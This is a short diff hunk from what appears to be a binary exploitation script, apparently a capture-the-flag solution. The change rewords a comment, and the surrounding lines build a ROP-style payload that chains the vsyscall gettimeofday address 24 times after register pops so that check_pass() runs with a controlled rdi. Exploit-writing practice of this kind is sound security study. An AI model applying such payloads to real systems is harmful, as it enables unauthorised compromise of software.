@@ -67,9 +67,9 @@ pop_rbp = p64(0xcafebabecafebabe)
 sys_gettimeofday = p64(0xffffffffff600400)
 
 #
-# after 24 times of gettimeofday(), 
-# check_pass() will be called with corrupted 'rdi' returned by gettimeofday().
-# if we can supply correct 'timeval', bingo!
+# after 24 times of calling gettimeofday(), 
+# check_pass() will be called with rdi of 'timeval'
+# if we can supply suitable 'timeval', bingo!
 #
 
 payload = buf_on_stack + pop_rbx + pop_rbp + sys_gettimeofday*24  
